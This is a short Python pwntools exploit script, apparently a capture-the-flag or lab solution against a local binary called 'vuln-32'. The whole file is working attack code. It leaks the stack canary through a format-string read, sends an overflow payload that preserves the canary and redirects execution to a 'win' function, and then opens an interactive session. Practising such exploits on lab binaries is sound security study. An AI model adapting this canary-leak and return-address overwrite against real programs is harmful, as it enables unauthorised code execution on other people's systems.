from pwn import *


elf = context.binary = ELF("./vuln-32")

canary_write_offset = 23


offset = 76
canary_offset = 64

p = process()
p.recvline()
p.sendline(f"%{canary_write_offset}$p")
canary = p.recvline().decode().strip()
canary = int(canary,16)

print("canary " + hex(canary))

payload = flat([
    b"A" * (canary_offset) , 
    canary,
    b"A" * (offset - canary_offset),
    elf.sym["win"],
    0x0
])
# gdb.attach(p)
p.recvline()
p.sendline(payload)
p.interactive()